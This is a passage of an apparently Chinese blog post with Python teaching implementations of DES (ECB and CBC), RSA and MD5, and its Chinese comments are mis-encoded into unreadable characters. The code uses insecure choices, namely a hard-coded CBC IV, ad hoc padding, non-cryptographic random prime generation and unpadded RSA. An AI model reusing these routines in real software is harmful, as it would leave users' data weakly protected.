ä¸´æ—¶å˜é‡ç”¨äºå·¦å³ä¸¤éƒ¨åˆ†äº¤æ¢</span>        text_right = xor(F_function(text_right, key_list[i]) , text_left) <span class="hljs-comment">#F å‡½æ•°çš„ä½œç”¨ R(32ä½)-&gt;Eç›’(48ä½)-&gt;ä¸keyçš„å­å¯†é’¥å¼‚æˆ–(32ä½)-&gt;Sç›’(32ä½)-&gt;Pç½®æ¢(32ä½)</span>        text_left = mes_tmp    fin_right = text_right       <span class="hljs-comment"># ç¬¬åå…­è½®åŠ å¯†</span>    fin_left = xor(F_function(text_right, key_list[<span class="hljs-number">15</span>]), text_left)    criph_text = fin_left + fin_right    criph_text = IP_re(criph_text)     <span class="hljs-comment">#  IPé€†ç½®æ¢</span>    <span class="hljs-keyword">return</span> criph_text<span class="hljs-comment"># é’ˆå¯¹ä¸€ç»„çš„è§£å¯†ç¨‹åº</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DESdecode</span>(<span class="hljs-params">text, key</span>):</span>  <span class="hljs-comment">#å¯†æ–‡ç›´æ¥è¾“64ä½2è¿›åˆ¶</span>    key_bin = str_process(key)    <span class="hljs-comment"># å°†å¯†é’¥è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°</span>    key_list = key_gen(key_bin)   <span class="hljs-comment"># ç”Ÿæˆçš„åå…­ä¸ªå­å¯†é’¥</span>    text = begin_change(text)   <span class="hljs-comment"># å…ˆåˆå§‹å€¼æ¢ ä¸åŠ å¯†è¿‡ç¨‹ç›¸å</span>    cipher_left = text[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>]    <span class="hljs-comment"># R16</span>    cipher_right = text[<span class="hljs-number">32</span>:]    <span class="hljs-comment"># L16</span>    i = <span class="hljs-number">15</span>    <span class="hljs-keyword">while</span> i &gt; <span class="hljs-number">0</span>:                <span class="hljs-comment"># åäº”è½®åŠ å¯† åè¿‡æ¥</span>        cipher_tmp = cipher_right   <span class="hljs-comment">#è®¾ç½®ä¸€ä¸ªä¸´æ—¶å˜é‡ç”¨äºåé¢çš„äº¤æ¢</span>        cipher_right = xor(cipher_left, F_function(cipher_right, key_list[i]))    <span class="hljs-comment"># F å‡½æ•°çš„ä½œç”¨ R(32ä½)-&gt;Eç›’(48ä½)-&gt;ä¸keyçš„å­å¯†é’¥å¼‚æˆ–(32ä½)-&gt;Sç›’(32ä½)-&gt;Pç½®æ¢(32ä½)</span>                                                                                  <span class="hljs-comment"># F å‡½æ•°å¤„ç†å®Œåä¸L(32ä½)å¼‚æˆ–</span>        cipher_left = cipher_tmp    <span class="hljs-comment"># å·¦å³äº¤æ¢å®Œæˆ</span>        i = i - <span class="hljs-number">1</span>    left_text = xor(cipher_left, F_function(cipher_right, key_list[<span class="hljs-number">0</span>])) <span class="hljs-comment"># ä¸€</span>    right_text = cipher_right                                           <span class="hljs-comment"># äºŒ ä¸‰ è¿™ä¸‰æ­¥æ˜¯ç¬¬åå…­è½®åŠ å¯†</span>    plain_bin = left_text + right_text                                  <span class="hljs-comment">#</span>    plain_bin = IP_re(plain_bin)                                        <span class="hljs-comment">#</span>    plain_text = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plain_bin), <span class="hljs-number">8</span>):        plain_text += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(plain_bin[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))    <span class="hljs-keyword">return</span> plain_text<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Divide_text</span>(<span class="hljs-params">order,text,key</span>):</span>    <span class="hljs-comment"># å°†æ˜æ–‡æˆ–è€…æ˜æ–‡åˆ†ç»„ æ˜æ–‡åˆ†æˆ8ä¸ªå­—ç¬¦ä¸€ç»„ï¼Œå¯†æ–‡åˆ™åˆ†æˆ64bitä¸€ç»„</span>    block_text = []    res = <span class="hljs-string">&quot;&quot;</span>    length = <span class="hljs-number">0</span>    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&quot;E&quot;</span>:        length = <span class="hljs-number">8</span>    <span class="hljs-keyword">else</span>:        length = <span class="hljs-number">64</span>    i = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> text[i:i+length] != <span class="hljs-string">&quot;&quot;</span>:        block_text.append(text[i:i+length])        i += length    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&#x27;E&#x27;</span>:        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]) != <span class="hljs-number">8</span>:       <span class="hljs-comment"># æœ€åä¸€ç»„æ˜æ–‡å¦‚æœä¸å¤Ÿå…«ä¸ªå­—ç¬¦åˆ™æ·»åŠ  + è¡¥é½å…«ä¸ª  å¦åˆ™ç¨‹åºä¼šæŠ¥é”™</span>            block_text[-<span class="hljs-number">1</span>] = block_text[-<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;+&#x27;</span> * (<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]))        <span class="hljs-keyword">for</span> text <span class="hljs-keyword">in</span> block_text:             <span class="hljs-comment"># åˆ†åˆ«å¯¹æ¯ç»„åŠ å¯†</span>            res += DESencode(text, key)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">for</span> text <span class="hljs-keyword">in</span> block_text:             <span class="hljs-comment"># å¯¹å¯†æ–‡è§£å¯†</span>            res += DESdecode(text, key)    <span class="hljs-keyword">return</span> res<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:        plaintext = <span class="hljs-string">&#x27;&#x27;</span>        ciphertext = <span class="hljs-string">&#x27;&#x27;</span>        key = <span class="hljs-string">&#x27;&#x27;</span>        order = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;åŠ å¯†è¯·æŒ‰E,è§£å¯†è¯·æŒ‰D:&quot;</span>)        <span class="hljs-keyword">if</span> order == <span class="hljs-string">&#x27;E&#x27;</span>:            plaintext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æ˜æ–‡ï¼š&quot;</span>)            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥å¯†é’¥ï¼š&quot;</span>)            ciphertext = Divide_text(order, plaintext, key)            print(<span class="hljs-string">&quot;å¯†æ–‡æ˜¯ï¼š&quot;</span>)            print(ciphertext)        <span class="hljs-keyword">else</span>:            ciphertext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥å¯†æ–‡ï¼š&quot;</span>)            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥å¯†é’¥ï¼š&quot;</span>)            plaintext = Divide_text(order, ciphertext, key)            print(<span class="hljs-string">&quot;æ˜æ–‡æ˜¯ï¼š&quot;</span>)            print(plaintext)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre><p>DES_CBCæ¨¡å¼</p><p>åªéœ€è¦ä¿®æ”¹ECBæ¨¡å¼ä¸­çš„ Divide_text éƒ¨åˆ†</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Divide_text</span>(<span class="hljs-params">order,text,key</span>):</span>    <span class="hljs-comment"># å°†æ˜æ–‡æˆ–è€…æ˜æ–‡åˆ†ç»„ æ˜æ–‡åˆ†æˆ8ä¸ªå­—ç¬¦ä¸€ç»„ï¼Œå¯†æ–‡åˆ™åˆ†æˆ64bitä¸€ç»„</span>    block_text = []    IV = <span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>                 <span class="hljs-comment"># åˆå§‹åŒ–å‘é‡</span>    IV_bin = str_process(IV)    res = <span class="hljs-string">&quot;&quot;</span>    length = <span class="hljs-number">0</span>    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&quot;E&quot;</span>:        length = <span class="hljs-number">8</span>    <span class="hljs-keyword">else</span>:        length = <span class="hljs-number">64</span>    i = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> text[i:i+length] != <span class="hljs-string">&quot;&quot;</span>:        block_text.append(text[i:i+length])        i += length    tmp = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-comment"># åŠ å¯†</span>    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&#x27;E&#x27;</span>:        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]) != <span class="hljs-number">8</span>:       <span class="hljs-comment"># æœ€åä¸€ç»„æ˜æ–‡å¦‚æœä¸å¤Ÿå…«ä¸ªå­—ç¬¦åˆ™æ·»åŠ  + è¡¥é½å…«ä¸ª  å¦åˆ™ç¨‹åºä¼šæŠ¥é”™</span>            block_text[-<span class="hljs-number">1</span>] = block_text[-<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;+&#x27;</span> * (<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]))        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(block_text)):             <span class="hljs-comment"># åˆ†åˆ«å¯¹æ¯ç»„åŠ å¯†</span>            <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> :                tmp = DESencode(block_text[i],key, IV_bin)                res += tmp            <span class="hljs-keyword">else</span>:                tmp = DESencode(block_text[i],key,tmp)                res += tmp    <span class="hljs-comment"># è§£å¯†</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(block_text)):            <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:                tmp = block_text[i]                res += DESdecode(block_text[i], key, IV_bin)            <span class="hljs-keyword">else</span>:                res += DESdecode(block_text[i], key, tmp)                tmp = block_text[i]    <span class="hljs-keyword">return</span> res</code></pre><h1 id="å››ã€RSA"><a href="#å››ã€RSA" class="headerlink" title="å››ã€RSA"></a>å››ã€RSA</h1><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2020/12/23 14:24</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : rsa.py</span><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> random<span class="hljs-comment"># æ¨¡é‡å¤å¹³æ–¹æ³•</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fast_mod</span>(<span class="hljs-params">p,q,n</span>):</span>     <span class="hljs-comment"># pä¸ºåº•æ•°ï¼Œpä¸ºæŒ‡æ•°</span>    res = <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span> q:        <span class="hljs-keyword">if</span> q &amp; <span class="hljs-number">1</span>:            res = (res * p) % n        q &gt;&gt;= <span class="hljs-number">1</span>             <span class="hljs-comment"># å³ç§»1ä½</span>        p = (p * p) % n    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># è®¡ç®—å‡ºd</span><span class="hljs-comment">#è¿™ä¸ªæ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚æ¨¡é€†,ç”¨äºæ±‚d</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">caculateD</span>(<span class="hljs-params">a, m</span>):</span>    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:        q = u3//v3        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3    <span class="hljs-keyword">return</span> u1%m<span class="hljs-comment"># å°†å­—ç¬¦è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str2Hex</span>(<span class="hljs-params">m</span>):</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">&quot;&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(x)) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> m)<span class="hljs-comment"># ç´ æ€§æ£€éªŒï¼šé‡‡ç”¨ Miler-Rabin æ£€éªŒæ³•</span><span class="hljs-comment"># æ‰€æœ‰çš„ğ‘Ÿ âˆˆ [0, ğ‘  âˆ’ 1]ï¼Œè‹¥ğ‘^ğ‘‘ â‰  1(ğ‘šğ‘œğ‘‘ ğ‘›)ä¸”ğ‘^((2^ğ‘Ÿ)*ğ‘‘) â‰  âˆ’1(ğ‘šğ‘œğ‘‘ ğ‘›)ï¼Œåˆ™ğ‘›æ˜¯åˆæ•°ã€‚å¦åˆ™ï¼Œğ‘›æœ‰ 3/4çš„æ¦‚ç‡ä¸ºç´ æ•°</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">miller_rabin</span>(<span class="hljs-params">n</span>):</span>    s = n - <span class="hljs-number">1</span>    t = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> s % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:  <span class="hljs-comment"># n,s,tä¹‹é—´çš„å…³ç³»ä¸º n = 2^s * t</span>        s = s // <span class="hljs-number">2</span>        t += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> trials <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):   <span class="hljs-comment"># å¯ä»¥å¤šå¢åŠ å‡ è½®ä¿è¯å¤§æ¦‚ç‡ä¸ºç´ æ•°</span>        a = random.randrange(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>) <span class="hljs-comment"># éšæœºç”Ÿæˆa</span>        v = <span class="hljs-built_in">pow</span>(a, s, n)               <span class="hljs-comment"># éªŒè¯ a^(n-1) mod n</span>        <span class="hljs-keyword">if</span> v != <span class="hljs-number">1</span>:            i = <span class="hljs-number">0</span>            <span class="hljs-keyword">while</span> v != (n - <span class="hljs-number">1</span>):                <span class="hljs-keyword">if</span> i == t - <span class="hljs-number">1</span>:                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>                <span class="hljs-keyword">else</span>:                    i = i + <span class="hljs-number">1</span>                    v = (v ** <span class="hljs-number">2</span>) % n    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><span class="hljs-comment"># ç”Ÿæˆç´ æ•° å…ˆç”Ÿæˆ1024ä½çš„å¥‡æ•°ï¼Œå†è¿›è¡Œç´ æ€§æ£€éªŒï¼Œé€šè¿‡åˆ™ç”Ÿæˆè¯¥ç´ æ•°</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genPrime</span>(<span class="hljs-params">b=<span class="hljs-number">1024</span></span>):</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:                             <span class="hljs-comment"># è®¾ç½®æ­»å¾ªç¯ç›´åˆ°ç”Ÿæˆç´ æ•°æ‰é€€å‡º</span>        res = <span class="hljs-string">&quot;1&quot;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b-<span class="hljs-number">2</span>):            res += <span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))        res += <span class="hljs-string">&quot;1&quot;</span>                              <span class="hljs-comment"># æœ€åä¸€ä½ä¸º1ä¿è¯ä¸ºå¥‡æ•°</span>        res = <span class="hljs-built_in">int</span>(res,<span class="hljs-number">2</span>)        <span class="hljs-keyword">if</span> miller_rabin(res):            <span class="hljs-keyword">return</span> res                          <span class="hljs-comment"># ç›´åˆ°è¯¥æ•°é€šè¿‡ç´ æ•°æ£€éªŒæ‰æ¨å‡ºå¾ªç¯</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genE</span>(<span class="hljs-params">phi_n</span>):</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        e = genPrime(b=random.randint(<span class="hljs-number">3</span>,<span class="hljs-number">13</span>))  <span class="hljs-comment">#éšæœºç”Ÿæˆe</span>        <span class="hljs-keyword">if</span> e &lt; <span class="hljs-number">2000</span> :                  <span class="hljs-comment"># eä¸èƒ½å¤ªå°</span>            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">if</span> phi_n%e != <span class="hljs-number">0</span>:               <span class="hljs-comment"># ä¿è¯eä¸èƒ½è¢«phiæ•´é™¤</span>            <span class="hljs-keyword">return</span> e<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RSAEncode</span>(<span class="hljs-params">m, e, n</span>):</span>               <span class="hljs-comment"># åŠ å¯†å…¬å¼ m^e mod n</span>    m = <span class="hljs-built_in">int</span>(str2Hex(m), <span class="hljs-number">16</span>)           <span class="hljs-comment"># å°†å­—ç¬¦è½¬æ¢ä¸ºäºŒè¿›åˆ¶</span>    c = fast_mod(m, e, n)    <span class="hljs-keyword">return</span> c<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RSADecode</span>(<span class="hljs-params">c, d, n</span>):</span>                 <span class="hljs-comment"># åŠ å¯†å…¬å¼ c^d mod n</span>    plaintext = fast_mod(c,d,n)    plaintext = <span class="hljs-built_in">str</span>(long_to_bytes(plaintext).decode()) <span class="hljs-comment"># å°†æ•°å­—è½¬æ¢ä¸ºå­—ç¬¦</span>    <span class="hljs-keyword">return</span> plaintext<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    <span class="hljs-comment"># ç”Ÿæˆä¸¤ä¸ªå¤§ç´ æ•°på’Œq</span>    print(<span class="hljs-string">&quot;Generate p,q and e, please wait... &quot;</span>)    p = genPrime()    q = genPrime()    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;p = &quot;</span>+<span class="hljs-built_in">str</span>(p))    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;q = &quot;</span>+<span class="hljs-built_in">str</span>(q))    n = p*q    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;n = &quot;</span>+<span class="hljs-built_in">str</span>(n))    <span class="hljs-comment"># ç”¨æ¬§æ‹‰å®šç†è®¡ç®— phi_n</span>    phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)    <span class="hljs-comment"># ç”Ÿæˆe</span>    e = genE(phi_n)    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;e = &quot;</span>+<span class="hljs-built_in">str</span>(e))    <span class="hljs-comment"># m = &quot;Hello world!&quot;</span>    m = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥æ˜æ–‡: &#x27;</span>))    <span class="hljs-comment"># åŠ å¯†ç®—æ³•</span>    Cryphtext = RSAEncode(m, e, n)    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;The Ciphertext is: &quot;</span>+<span class="hljs-built_in">str</span>(Cryphtext))    <span class="hljs-comment"># è§£å¯†ç®—æ³•</span>    d = caculateD(e, phi_n)    Plaintext = RSADecode(Cryphtext, d, n)    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;The Plaintext is: &quot;</span>+Plaintext)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre><h1 id="äº”ã€MD5"><a href="#äº”ã€MD5" class="headerlink" title="äº”ã€MD5"></a>äº”ã€MD5</h1><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2020/12/18 21:50</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : MD5.py</span><span class="hljs-keyword">import</span> math<span class="hljs-comment"># å®šä¹‰åˆå§‹å‘é‡abcd,å¹¶å°†å…¶è½¬æ¢æˆ2è¿›åˆ¶,ä¸”è¡¥0åˆ°32ä½</span><span class="hljs-comment"># æ ‡å‡†çš„å¹»æ•°ï¼ˆç‰©ç†é¡ºåºï¼‰æ˜¯ï¼ˆA=(01234567)16ï¼ŒB=(89ABCDEF)16ï¼ŒC=(FEDCBA98)16ï¼ŒD=(76543210)16ï¼‰ã€‚å¦‚æœåœ¨ç¨‹åºä¸­å®šä¹‰åº”è¯¥æ˜¯:</span><span class="hljs-comment"># ï¼ˆA=0X67452301Lï¼ŒB=0XEFCDAB89Lï¼ŒC=0X98BADCFELï¼ŒD=0X10325476Lï¼‰</span>ABCD_list = [<span class="hljs-string">&#x27;67452301&#x27;</span>,<span class="hljs-string">&#x27;efcdab89&#x27;</span>,<span class="hljs-string">&#x27;98badcfe&#x27;</span>,<span class="hljs-string">&#x27;10325476&#x27;</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ABCD_list)):    tmp = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(ABCD_list[i], <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:]    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) &lt; <span class="hljs-number">32</span>:        tmp = (<span class="hljs-number">32</span> - <span class="hljs-built_in">len</span>(tmp)) * <span class="hljs-string">&#x27;0&#x27;</span> + tmp    ABCD_list[i] = tmpA0,B0,C0,D0 = ABCD_list[<span class="hljs-number">0</span>], ABCD_list[<span class="hljs-number">1</span>], ABCD_list[<span class="hljs-number">2</span>], ABCD_list[<span class="hljs-number">3</span>]<span class="hljs-comment"># ç”Ÿæˆç¬¬1-64ä¸ªå¼å­çš„ç¬¬iä¸ª32æ¯”ç‰¹å¸¸æ•°</span>Ti = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>):    result = (<span class="hljs-built_in">int</span>(<span class="hljs-number">4294967296</span> * <span class="hljs-built_in">abs</span>(math.sin(i + <span class="hljs-number">1</span>)))) &amp; <span class="hljs-number">0xffffffff</span>    result = <span class="hljs-built_in">bin</span>(result)[<span class="hljs-number">2</span>:]    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(result) &lt; <span class="hljs-number">32</span>:        result = (<span class="hljs-number">32</span> - <span class="hljs-built_in">len</span>(result)) * <span class="hljs-string">&#x27;0&#x27;</span> + result    Ti.append(result)<span class="hljs-comment"># å®ç°x,yçš„é€æ¯”ç‰¹ä¸</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">and1</span>(<span class="hljs-params">x, y</span>):</span>    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):        res += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(x[i])&amp;<span class="hljs-built_in">int</span>(y[i]))    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># å®ç°x,yçš„é€æ¯”ç‰¹æˆ–</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">or1</span>(<span class="hljs-params">x, y</span>):</span>    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):        res += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(x[i])|<span class="hljs-built_in">int</span>(y[i]))    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># å®ç°x,yçš„é€æ¯”ç‰¹å¼‚æˆ–</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span>(<span class="hljs-params">x, y</span>):</span>    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):        res += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(x[i])^<span class="hljs-built_in">int</span>(y[i]))    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># å®ç°xçš„é€æ¯”ç‰¹é€»è¾‘å</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse</span>(<span class="hljs-params">x</span>):</span>    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):        res += <span class="hljs-built_in">str</span>((<span class="hljs-built_in">int</span>(x[i], <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>) % <span class="hljs-number">2</span>)    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># å®ç°xçš„å¾ªç¯å·¦ç§»</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shift</span>(<span class="hljs-params">x, i</span>):</span>    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x) - i):        res = res + x[t + i:t + i + <span class="hljs-number">1</span>]   <span class="hljs-comment"># å…ˆä¿å­˜ x[i:]  å†ä¿å­˜x[:i]</span>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, i):        res = res + x[y:y + <span class="hljs-number">1</span>]    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># å®ç°æ•´æ•°æ¨¡2çš„ä¸‰åäºŒæ¬¡æ–¹åŠ æ³•</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">x, y</span>):</span>    a = <span class="hljs-built_in">int</span>(x,<span class="hljs-number">2</span>)  <span class="hljs-comment">#å…ˆå°†äºŒè¿›åˆ¶è½¬æ¢æˆåè¿›åˆ¶</span>    b = <span class="hljs-built_in">int</span>(y,<span class="hljs-number">2</span>)    res = (a + b)%(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)    res = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(res) != <span class="hljs-number">32</span>:    <span class="hljs-comment"># è¡¥å……åˆ°32ä½</span>        res = (<span class="hljs-number">32</span>-<span class="hljs-built_in">len</span>(res))*<span class="hljs-string">&#x27;0&#x27;</span>+res    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># å®šä¹‰f,g,h,iå‡½æ•°</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ffunc</span>(<span class="hljs-params">x, y, z</span>):</span>  <span class="hljs-comment"># ((x&amp;y)|((~x)&amp;z))</span>    t = and1(x, y)    t1 = reverse(x)    t2 = and1(t1, z)    <span class="hljs-keyword">return</span> or1(t, t2)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gfunc</span>(<span class="hljs-params">x, y, z</span>):</span>  <span class="hljs-comment"># ((x&amp;z)|(y&amp;(~z)))</span>    t = and1(x, z)    t1 = reverse(z)    t2 = and1(y, t1)    <span class="hljs-keyword">return</span> or1(t, t2)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hfunc</span>(<span class="hljs-params">x, y, z</span>):</span> <span class="hljs-comment"># (x^y^z)</span>    t1 = xor(x, y)    t2 = xor(t1, z)    <span class="hljs-keyword">return</span> t2<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ifunc</span>(<span class="hljs-params">x, y, z</span>):</span> <span class="hljs-comment"># (y^(x|(~z)))</span>    t = reverse(z)    t1 = or1(x, t)    <span class="hljs-keyword">return</span> xor(y, t1)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">text</span>):</span>    text1 = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> text:        t = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(i))        t = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(t, <span class="hljs-number">10</span>))[<span class="hljs-number">2</span>:])        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(t) &lt; <span class="hljs-number">8</span>:                 <span class="hljs-comment"># å°†æ¯ä¸ªå­—ç¬¦è½¬æ¢æˆ8ä½äºŒè¿›åˆ¶æ•°</span>            <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(t)):                t = <span class="hljs-string">&#x27;0&#x27;</span> + t        text1 = text1 + t    length = <span class="hljs-built_in">len</span>(text1)    length1 = <span class="hljs-number">512</span> - <span class="hljs-built_in">len</span>(text1) - <span class="hljs-number">65</span>    <span class="hljs-comment"># length1æ˜¯è¦å¡«å……0çš„ä½æ•°</span>    text1 = text1 + <span class="hljs-string">&#x27;1&#x27;</span>                <span class="hljs-comment"># ç¬¬ä¸€ä½æ·»åŠ  0</span>    text1 = text1 + <span 